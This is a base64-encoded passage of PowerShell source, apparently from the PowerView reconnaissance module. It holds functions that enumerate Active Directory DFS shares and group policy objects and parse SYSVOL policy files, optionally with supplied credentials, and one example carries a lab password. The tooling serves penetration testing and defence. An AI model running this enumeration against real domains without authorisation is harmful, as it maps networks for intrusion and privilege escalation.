2V0U3RyaW5nKCR0YXJnZXRfbGlzdFsyLi4oJHRhcmdldF9saXN0Lkxlbmd0aC0xKV0pCiAgICAgICAgICAgICAgICAgICAgICAgICRERlNzaGFyZXMgKz0gJHhtbC50YXJnZXRzLkNoaWxkTm9kZXMgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRUYXJnZXQgPSAkXy5Jbm5lclRleHQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoICRUYXJnZXQuQ29udGFpbnMoJ1wnKSApIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJERGU3Jvb3QgPSAkVGFyZ2V0LnNwbGl0KCdcJylbM10KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNoYXJlTmFtZSA9ICRQcm9wZXJ0aWVzLidtc2Rmcy1saW5rcGF0aHYyJ1swXQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBOZXctT2JqZWN0IC1UeXBlTmFtZSBQU09iamVjdCAtUHJvcGVydHkgQHsnTmFtZSc9IiRERlNyb290JFNoYXJlTmFtZSI7J1JlbW90ZVNlcnZlck5hbWUnPSRUYXJnZXQuc3BsaXQoJ1wnKVsyXX0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5ERlNTaGFyZV0gR2V0LURvbWFpbkRGU1NoYXJlVjIgZXJyb3IgaW4gcGFyc2luZyB0YXJnZXQgOiAkXyIKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBpZiAoJFJlc3VsdHMpIHsKICAgICAgICAgICAgICAgICAgICAgICAgdHJ5IHsgJFJlc3VsdHMuZGlzcG9zZSgpIH0KICAgICAgICAgICAgICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5ERlNTaGFyZV0gRXJyb3IgZGlzcG9zaW5nIG9mIHRoZSBSZXN1bHRzIG9iamVjdDogJF8iCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgJERGU1NlYXJjaGVyLmRpc3Bvc2UoKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIltHZXQtRG9tYWluREZTU2hhcmVdIEdldC1Eb21haW5ERlNTaGFyZVYyIGVycm9yIDogJF8iCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAkREZTc2hhcmVzIHwgU29ydC1PYmplY3QgLVVuaXF1ZSAtUHJvcGVydHkgJ1JlbW90ZVNlcnZlck5hbWUnCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9CgogICAgUFJPQ0VTUyB7CiAgICAgICAgJERGU3NoYXJlcyA9IEAoKQoKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEb21haW4nXSkgewogICAgICAgICAgICBGb3JFYWNoICgkVGFyZ2V0RG9tYWluIGluICREb21haW4pIHsKICAgICAgICAgICAgICAgICRTZWFyY2hlckFyZ3VtZW50c1snRG9tYWluJ10gPSAkVGFyZ2V0RG9tYWluCiAgICAgICAgICAgICAgICBpZiAoJFZlcnNpb24gLW1hdGNoICdhbGx8MScpIHsKICAgICAgICAgICAgICAgICAgICAkREZTc2hhcmVzICs9IEdldC1Eb21haW5ERlNTaGFyZVYxIEBTZWFyY2hlckFyZ3VtZW50cwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgaWYgKCRWZXJzaW9uIC1tYXRjaCAnYWxsfDInKSB7CiAgICAgICAgICAgICAgICAgICAgJERGU3NoYXJlcyArPSBHZXQtRG9tYWluREZTU2hhcmVWMiBAU2VhcmNoZXJBcmd1bWVudHMKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBlbHNlIHsKICAgICAgICAgICAgaWYgKCRWZXJzaW9uIC1tYXRjaCAnYWxsfDEnKSB7CiAgICAgICAgICAgICAgICAkREZTc2hhcmVzICs9IEdldC1Eb21haW5ERlNTaGFyZVYxIEBTZWFyY2hlckFyZ3VtZW50cwogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmICgkVmVyc2lvbiAtbWF0Y2ggJ2FsbHwyJykgewogICAgICAgICAgICAgICAgJERGU3NoYXJlcyArPSBHZXQtRG9tYWluREZTU2hhcmVWMiBAU2VhcmNoZXJBcmd1bWVudHMKICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgJERGU3NoYXJlcyB8IFNvcnQtT2JqZWN0IC1Qcm9wZXJ0eSAoJ1JlbW90ZVNlcnZlck5hbWUnLCdOYW1lJykgLVVuaXF1ZQogICAgfQp9CgoKIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKIwojIEdQTyByZWxhdGVkIGZ1bmN0aW9ucy4KIwojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwoKZnVuY3Rpb24gR2V0LUdwdFRtcGwgewo8IwouU1lOT1BTSVMKCkhlbHBlciB0byBwYXJzZSBhIEdwdFRtcGwuaW5mIHBvbGljeSBmaWxlIHBhdGggaW50byBhIGhhc2h0YWJsZS4KCkF1dGhvcjogV2lsbCBTY2hyb2VkZXIgKEBoYXJtajB5KSAgCkxpY2Vuc2U6IEJTRCAzLUNsYXVzZSAgClJlcXVpcmVkIERlcGVuZGVuY2llczogQWRkLVJlbW90ZUNvbm5lY3Rpb24sIFJlbW92ZS1SZW1vdGVDb25uZWN0aW9uLCBHZXQtSW5pQ29udGVudCAgCgouREVTQ1JJUFRJT04KClBhcnNlcyBhIEdwdFRtcGwuaW5mIGludG8gYSBjdXN0b20gaGFzaHRhYmxlIHVzaW5nIEdldC1JbmlDb250ZW50LiBJZiBhCkdQTyBvYmplY3QgaXMgcGFzc2VkLCBHUE9QQVRIXE1BQ0hJTkVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcU2VjRWRpdFxHcHRUbXBsLmluZgppcyBjb25zdHJ1Y3RlZCBhbmQgYXNzdW1lZCB0byBiZSB0aGUgcGFyc2UgdGFyZ2V0LiBJZiAtQ3JlZGVudGlhbCBpcyBwYXNzZWQsCkFkZC1SZW1vdGVDb25uZWN0aW9uIGlzIHVzZWQgdG8gbW91bnQgXFxUQVJHRVRcU1lTVk9MIHdpdGggdGhlIHNwZWNpZmllZCBjcmVkcywKdGhlIGZpbGVzIGFyZSBwYXJzZWQsIGFuZCB0aGUgY29ubmVjdGlvbiBpcyBkZXN0cm95ZWQgbGF0ZXIgd2l0aCBSZW1vdmUtUmVtb3RlQ29ubmVjdGlvbi4KCi5QQVJBTUVURVIgR3B0VG1wbFBhdGgKClNwZWNpZmllcyB0aGUgR3B0VG1wbC5pbmYgZmlsZSBwYXRoIG5hbWUgdG8gcGFyc2UuCgouUEFSQU1FVEVSIE91dHB1dE9iamVjdAoKU3dpdGNoLiBPdXRwdXQgYSBjdXN0b20gUFNPYmplY3QgaW5zdGVhZCBvZiBhIGhhc2h0YWJsZS4KCi5QQVJBTUVURVIgQ3JlZGVudGlhbAoKQSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0gb2JqZWN0IG9mIGFsdGVybmF0ZSBjcmVkZW50aWFscwpmb3IgY29ubmVjdGlvbiB0byB0aGUgcmVtb3RlIHN5c3RlbS4KCi5FWEFNUExFCgpHZXQtR3B0VG1wbCAtR3B0VG1wbFBhdGggIlxcZGV2LnRlc3RsYWIubG9jYWxcc3lzdm9sXGRldi50ZXN0bGFiLmxvY2FsXFBvbGljaWVzXHszMUIyRjM0MC0wMTZELTExRDItOTQ1Ri0wMEMwNEZCOTg0Rjl9XE1BQ0hJTkVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcU2VjRWRpdFxHcHRUbXBsLmluZiIKClBhcnNlIHRoZSBkZWZhdWx0IGRvbWFpbiBwb2xpY3kgLmluZiBmb3IgZGV2LnRlc3RsYWIubG9jYWwKCi5FWEFNUExFCgpHZXQtRG9tYWluR1BPIHRlc3RpbmcgfCBHZXQtR3B0VG1wbAoKUGFyc2UgdGhlIEdwdFRtcGwuaW5mIHBvbGljeSBmb3IgdGhlIEdQTyB3aXRoIGRpc3BsYXkgbmFtZSBvZiAndGVzdGluZycuCgouRVhBTVBMRQoKJFNlY1Bhc3N3b3JkID0gQ29udmVydFRvLVNlY3VyZVN0cmluZyAnUGFzc3dvcmQxMjMhJyAtQXNQbGFpblRleHQgLUZvcmNlCiRDcmVkID0gTmV3LU9iamVjdCBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbCgnVEVTVExBQlxkZm0uYScsICRTZWNQYXNzd29yZCkKR2V0LUdwdFRtcGwgLUNyZWRlbnRpYWwgJENyZWQgLUdwdFRtcGxQYXRoICJcXGRldi50ZXN0bGFiLmxvY2FsXHN5c3ZvbFxkZXYudGVzdGxhYi5sb2NhbFxQb2xpY2llc1x7MzFCMkYzNDAtMDE2RC0xMUQyLTk0NUYtMDBDMDRGQjk4NEY5fVxNQUNISU5FXE1pY3Jvc29mdFxXaW5kb3dzIE5UXFNlY0VkaXRcR3B0VG1wbC5pbmYiCgpQYXJzZSB0aGUgZGVmYXVsdCBkb21haW4gcG9saWN5IC5pbmYgZm9yIGRldi50ZXN0bGFiLmxvY2FsIHVzaW5nIGFsdGVybmF0ZSBjcmVkZW50aWFscy4KCi5PVVRQVVRTCgpIYXNodGFibGUKCk91cHV0cyBhIGhhc2h0YWJsZSByZXByZXNlbnRpbmcgdGhlIHBhcnNlZCBHcHRUbXBsLmluZiBmaWxlLgojPgoKICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1Nob3VsZFByb2Nlc3MnLCAnJyldCiAgICBbT3V0cHV0VHlwZShbSGFzaHRhYmxlXSldCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0gKAogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkVHJ1ZSldCiAgICAgICAgW0FsaWFzKCdncGNmaWxlc3lzcGF0aCcsICdQYXRoJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkR3B0VG1wbFBhdGgsCgogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJE91dHB1dE9iamVjdCwKCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5CiAgICApCgogICAgQkVHSU4gewogICAgICAgICRNYXBwZWRQYXRocyA9IEB7fQogICAgfQoKICAgIFBST0NFU1MgewogICAgICAgIHRyeSB7CiAgICAgICAgICAgIGlmICgoJEdwdFRtcGxQYXRoIC1NYXRjaCAnXFxcXC4qXFwuKicpIC1hbmQgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSkgewogICAgICAgICAgICAgICAgJFN5c1ZvbFBhdGggPSAiXFwkKChOZXctT2JqZWN0IFN5c3RlbS5VcmkoJEdwdFRtcGxQYXRoKSkuSG9zdClcU1lTVk9MIgogICAgICAgICAgICAgICAgaWYgKC1ub3QgJE1hcHBlZFBhdGhzWyRTeXNWb2xQYXRoXSkgewogICAgICAgICAgICAgICAgICAgICMgbWFwIElQQyQgdG8gdGhpcyBjb21wdXRlciBpZiBpdCdzIG5vdCBhbHJlYWR5CiAgICAgICAgICAgICAgICAgICAgQWRkLVJlbW90ZUNvbm5lY3Rpb24gLVBhdGggJFN5c1ZvbFBhdGggLUNyZWRlbnRpYWwgJENyZWRlbnRpYWwKICAgICAgICAgICAgICAgICAgICAkTWFwcGVkUGF0aHNbJFN5c1ZvbFBhdGhdID0gJFRydWUKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQoKICAgICAgICAgICAgJFRhcmdldEdwdFRtcGxQYXRoID0gJEdwdFRtcGxQYXRoCiAgICAgICAgICAgIGlmICgtbm90ICRUYXJnZXRHcHRUbXBsUGF0aC5FbmRzV2l0aCgnLmluZicpKSB7CiAgICAgICAgICAgICAgICAkVGFyZ2V0R3B0VG1wbFBhdGggKz0gJ1xNQUNISU5FXE1pY3Jvc29mdFxXaW5kb3dzIE5UXFNlY0VkaXRcR3B0VG1wbC5pbmYnCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtR3B0VG1wbF0gUGFyc2luZyBHcHRUbXBsUGF0aDogJFRhcmdldEdwdFRtcGxQYXRoIgoKICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snT3V0cHV0T2JqZWN0J10pIHsKICAgICAgICAgICAgICAgICRDb250ZW50cyA9IEdldC1JbmlDb250ZW50IC1QYXRoICRUYXJnZXRHcHRUbXBsUGF0aCAtT3V0cHV0T2JqZWN0IC1FcnJvckFjdGlvbiBTdG9wCiAgICAgICAgICAgICAgICBpZiAoJENvbnRlbnRzKSB7CiAgICAgICAgICAgICAgICAgICAgJENvbnRlbnRzIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1BhdGgnICRUYXJnZXRHcHRUbXBsUGF0aAogICAgICAgICAgICAgICAgICAgICRDb250ZW50cwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgJENvbnRlbnRzID0gR2V0LUluaUNvbnRlbnQgLVBhdGggJFRhcmdldEdwdFRtcGxQYXRoIC1FcnJvckFjdGlvbiBTdG9wCiAgICAgICAgICAgICAgICBpZiAoJENvbnRlbnRzKSB7CiAgICAgICAgICAgICAgICAgICAgJENvbnRlbnRzWydQYXRoJ10gPSAkVGFyZ2V0R3B0VG1wbFBhdGgKICAgICAgICAgICAgICAgICAgICAkQ29udGVudHMKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtR3B0VG1wbF0gRXJyb3IgcGFyc2luZyAkVGFyZ2V0R3B0VG1wbFBhdGggOiAkXyIKICAgICAgICB9CiAgICB9CgogICAgRU5EIHsKICAgICAgICAjIHJlbW92ZSB0aGUgU1lTVk9MIG1hcHBpbmdzCiAgICAgICAgJE1hcHBlZFBhdGhzLktleXMgfCBGb3JFYWNoLU9iamVjdCB7IFJlbW92ZS1SZW1vdGVDb25uZWN0aW9uIC1QYXRoICRfIH0KICAgIH0KfQoKCmZ1bmN0aW9uIEdldC1Hcm91cHNYTUwgewo8IwouU1lOT1BTSVMKCkhlbHBlciB0byBwYXJzZSBhIGdyb3Vwcy54bWwgZmlsZSBwYXRoIGludG8gYSBjdXN0b20gb2JqZWN0LgoKQXV0aG9yOiBXaWxsIFNjaHJvZWRlciAoQGhhcm1qMHkpICAKTGljZW5zZTogQlNEIDMtQ2xhdXNlICAKUmVxdWlyZWQgRGVwZW5kZW5jaWVzOiBBZGQtUmVtb3RlQ29ubmVjdGlvbiwgUmVtb3ZlLVJlbW90ZUNvbm5lY3Rpb24sIENvbnZlcnRUby1TSUQgIAoKLkRFU0NSSVBUSU9OCgpQYXJzZXMgYSBncm91cHMueG1sIGludG8gYSBjdXN0b20gb2JqZWN0LiBJZiAtQ3JlZGVudGlhbCBpcyBwYXNzZWQsCkFkZC1SZW1vdGVDb25uZWN0aW9uIGlzIHVzZWQgdG8gbW91bnQgXFxUQVJHRVRcU1lTVk9MIHdpdGggdGhlIHNwZWNpZmllZCBjcmVkcywKdGhlIGZpbGVzIGFyZSBwYXJzZWQsIGFuZCB0aGUgY29ubmVjdGlvbiBpcyBkZXN0cm95ZWQgbGF0ZXIgd2l0aCBSZW1vdmUtUmVtb3RlQ29ubmVjdGlvbi4KCi5QQVJBTUVURVIgR3JvdXBzWE1McGF0aAoKU3BlY2lmaWVzIHRoZSBncm91cHMueG1sIGZpbGUgcGF0aCBuYW1lIHRvIHBhcnNlLgoKLlBBUkFNRVRFUiBDcmVkZW50aWFsCgpBIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXSBvYmplY3Qgb2YgYWx0ZXJuYXRlIGNyZWRlbnRpYWxzCmZvciBjb25uZWN0aW9uIHRvIHRoZSByZW1vdGUgc3lzdGVtLgoKLk9VVFBVVFMKClBvd2VyVmlldy5Hcm91cHNYTUwKIz4KCiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNTaG91bGRQcm9jZXNzJywgJycpXQogICAgW091dHB1dFR5cGUoJ1Bvd2VyVmlldy5Hcm91cHNYTUwnKV0KICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSAoCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ1BhdGgnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRHcm91cHNYTUxQYXRoLAoKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkKICAgICkKCiAgICBCRUdJTiB7CiAgICAgICAgJE1hcHBlZFBhdGhzID0gQHt9CiAgICB9CgogICAgUFJPQ0VTUyB7CiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgaWYgKCgkR3JvdXBzWE1MUGF0aCAtTWF0Y2ggJ1xcXFwuKlxcLionKSAtYW5kICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkpIHsKICAgICAgICAgICAgICAgICRTeXNWb2xQYXRoID0gIlxcJCgoTmV3LU9iamVjdCBTeXN0ZW0uVXJpKCRHcm91cHNYTUxQYXRoKSkuSG9zdClcU1lTVk9MIgogICAgICAgICAgICAgICAgaWYgKC1ub3QgJE1hcHBlZFBhdGhzWyRTeXNWb2xQYXRoXSkgewogICAgICAgICAgICAgICAgICAgICMgbWFwIElQQyQgdG8gdGhpcyBjb21wdXRlciBpZiBpdCdzIG5vdCBhbHJlYWR5CiAgICAgICAgICAgICAgICAgICAgQWRkLVJlbW90ZUNvbm5lY3Rpb24gLVBhdGggJFN5c1ZvbFBhdGggLUNyZWRlbnRpYWwgJENyZWRlbnRpYWwKICAgICAgICAgICAgICAgICAgICAkTWFwcGVkUGF0aHNbJFN5c1ZvbFBhdGhdID0gJFRydWUKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQoKICAgICAgICAgICAgW1hNTF0kR3JvdXBzWE1MY29udGVudCA9IEdldC1Db250ZW50IC1QYXRoICRHcm91cHNYTUxQYXRoIC1FcnJvckFjdGlvbiBTdG9wCgogICAgICAgICAgICAjIHByb2Nlc3MgYWxsIGdyb3VwIHByb3BlcnRpZXMgaW4gdGhlIFhNTAogICAgICAgICAgICAkR3JvdXBzWE1MY29udGVudCB8IFNlbGVjdC1YbWwgIi9Hcm91cHMvR3JvdXAiIHwgU2VsZWN0LU9iamVjdCAtRXhwYW5kUHJvcGVydHkgbm9kZSB8IEZvckVhY2gtT2JqZWN0IHsKCiAgICAgICAgICAgICAgICAkR3JvdXBuYW1lID0gJF8uUHJvcGVydGllcy5ncm91cE5hbWUKCiAgICAgICAgICAgICAgICAjIGV4dHJhY3QgdGhlIGxvY2FsZ3JvdXAgc2lkIGZvciBtZW1iZXJvZgogICAgICAgICAgICAgICAgJEdyb3VwU0lEID0gJF8uUHJvcGVydGllcy5ncm91cFNpZAogICAgICAgICAgICAgICAgaWYgKC1ub3QgJEdyb3VwU0lEKSB7CiAgICAgICAgICAgICAgICAgICAgaWYgKCRHcm91cG5hbWUgLW1hdGNoICdBZG1pbmlzdHJhdG9ycycpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJEdyb3VwU0lEID0gJ1MtMS01LTMyLTU0NCcKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZWxzZWlmICgkR3JvdXBuYW1lIC1tYXRjaCAnUmVtb3RlIERlc2t0b3AnKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRHcm91cFNJRCA9ICdTLTEtNS0zMi01NTUnCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGVsc2VpZiAoJEdyb3VwbmFtZSAtbWF0Y2ggJ0d1ZXN0cycpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJEdyb3VwU0lEID0gJ1MtMS01LTMyLTU0NicKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJEdyb3VwU0lEID0gQ29udmVydFRvLVNJRCAtT2JqZWN0TmFtZSAkR3JvdXBuYW1lIC1DcmVkZW50aWFsICRDcmVkZW50aWFsCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkR3JvdXBTSUQgPSBDb252ZXJ0VG8tU0lEIC1PYmplY3ROYW1lICRHcm91cG5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAjIGV4dHJhY3Qgb3V0IG1lbWJlcnMgYWRkZWQgdG8gdGhpcyBncm91cAogICAgICAgICAgICAgICAgJE1lbWJlcnMgPSAkXy5Qcm9wZXJ0aWVzLm1lbWJlcnMgfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9wZXJ0eSBNZW1iZXIgfCBXaGVyZS1PYmplY3QgeyAkXy5hY3Rpb24gLW1hdGNoICdBREQnIH0gfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAgICAgaWYgKCRfLnNpZCkgeyAkXy5zaWQgfQogICAgICAgICAgICAgICAgICAgIGVsc2UgeyAkXy5uYW1lIH0KICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICBpZiAoJE1lbWJlcnMpIHsKICAgICAgICAgICAgICAgICAgICAjIGV4dHJhY3Qgb3V0IGFueS9hbGwgZmlsdGVycy4uLkkgaGF0ZSB5b3UgR1BQCiAgICAgICAgICAgICAgICAgICAgaWYgKCRfLmZpbHRlcnMpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJEZpbHRlcnMgPSAkXy5maWx0ZXJzLkdldEVudW1lcmF0b3IoKSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIE5ldy1PYmplY3QgLVR5cGVOYW1lIFBTT2JqZWN0IC1Qcm9wZXJ0eSBAeydUeXBlJyA9ICRfLkxvY2FsTmFtZTsnVmFsdWUnID0gJF8ubmFtZX0KICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgJEZpbHRlcnMgPSAkTnVsbAogICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgaWYgKCRNZW1iZXJzIC1pc25vdCBbU3lzdGVtLkFycmF5XSkgeyAkTWVtYmVycyA9IEAoJE1lbWJlcnMpIH0KCiAgICAgICAgICAgICAgICAgICAgJEdyb3Vwc1hNTCA9IE5ldy1PYmplY3QgUFNPYmplY3QKICAgICAgICAgICAgICAgICAgICAkR3JvdXBzWE1MIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0dQT1BhdGgnICRUYXJnZXRHcm91cHNYTUxQYXRoCiAgICAgICAgICAgICAgICAgICAgJEdyb3Vwc1hNTCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdGaWx0ZXJzJyAkRmlsdGVycwogICAgICAgICAgICAgICAgICAgICRHcm91cHNYTUwgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnR3JvdXBOYW1lJyAkR3JvdXBOYW1lCiAgICAgICAgICAgICAgICAgICAgJEdyb3Vwc1hNTCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdHcm91cFNJRCcgJEdyb3VwU0lECiAgICAgICAgICAgICAgICAgICAgJEdyb3Vwc1hNTCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdHcm91cE1lbWJlck9mJyAkTnVsbAogICAgICAgICAgICAgICAgICAgICRHcm91cHNYTUwgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnR3JvdXBNZW1iZXJzJyAkTWVtYmVycwogICAgICAgICAgICAgICAgICAgICRHcm91cHNYTUwuUFNPYmplY3QuVHlwZU5hbWVzLkluc2VydCgwLCAnUG93ZXJWaWV3Lkdyb3Vwc1hNTCcpCiAgICAgICAgICAgICAgICAgICAgJEdyb3Vwc1hNTAogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Hcm91cHNYTUxdIEVycm9yIHBhcnNpbmcgJFRhcmdldEdyb3Vwc1hNTFBhdGggOiAkXyIKICAgICAgICB9CiAgICB9CgogICAgRU5EIHsKICAgICAgICAjIHJlbW92ZSB0aGUgU1lTVk9MIG1hcHBpbmdzCiAgICAgICAgJE1hcHBlZFBhdGhzLktleXMgfCBGb3JFYWNoLU9iamVjdCB7IFJlbW92ZS1SZW1vdGVDb25uZWN0aW9uIC1QYXRoICRfIH0KICAgIH0KfQoKCmZ1bmN0aW9uIEdldC1Eb21haW5HUE8gewo8IwouU1lOT1BTSVMKClJldHVybiBhbGwgR1BPcyBvciBzcGVjaWZpYyBHUE8gb2JqZWN0cyBpbiBBRC4KCkF1dGhvcjogV2lsbCBTY2hyb2VkZXIgKEBoYXJtajB5KSAgCkxpY2Vuc2U6IEJTRCAzLUNsYXVzZSAgClJlcXVpcmVkIERlcGVuZGVuY2llczogR2V0LURvbWFpblNlYXJjaGVyLCBHZXQtRG9tYWluQ29tcHV0ZXIsIEdldC1Eb21haW5Vc2VyLCBHZXQtRG9tYWluT1UsIEdldC1OZXRDb21wdXRlclNpdGVOYW1lLCBHZXQtRG9tYWluU2l0ZSwgR2V0LURvbWFpbk9iamVjdCwgQ29udmVydC1MREFQUHJvcGVydHkgIAoKLkRFU0NSSVBUSU9OCgpCdWlsZHMgYSBkaXJlY3Rvcnkgc2VhcmNoZXIgb2JqZWN0IHVzaW5nIEdldC1Eb21haW5TZWFyY2hlciwgYnVpbGRzIGEgY3VzdG9tCkxEQVAgZmlsdGVyIGJhc2VkIG9uIHRhcmdldGluZy9maWx0ZXIgcGFyYW1ldGVycywgYW5kIHNlYXJjaGVzIGZvciBhbGwgb2JqZWN0cwptYXRjaGluZyB0aGUgY3JpdGVyaWEuIFRvIG9ubHkgcmV0dXJuIHNwZWNpZmljIHByb3BlcnRpZXMsIHVzZQoiLVByb3BlcnRpZXMgc2FtYWNjb3VudG5hbWUsdXNuY2hhbmdlZCwuLi4iLiBCeSBkZWZhdWx0LCBhbGwgR1BPIG9iamVjdHMgZm9yCnRoZSBjdXJyZW50IGRvbWFpbiBhcmUgcmV0dXJuZWQuIFRvIGVudW1lcmF0ZSBhbGwgR1BPcyB0aGF0IGFyZSBhcHBsaWVkIHRvCmEgcGFydGljdWxhciBtYWNoaW5lLCB1c2UgLUNvbXB1dGVyTmFtZSBYLgoKLlBBUkFNRVRFUiBJZGVudGl0eQoKQSBkaXNwbGF5IG5hbWUgKGUuZy4gJ1Rlc3QgR1BPJyksIERpc3Rpbmd1aXNoZWROYW1lIChlLmcuICdDTj17RjI2MEI3NkQtNTVDOC00NkM1LUJFRjEtOTAxNkREOThFMjcyfSxDTj1Qb2xpY2ll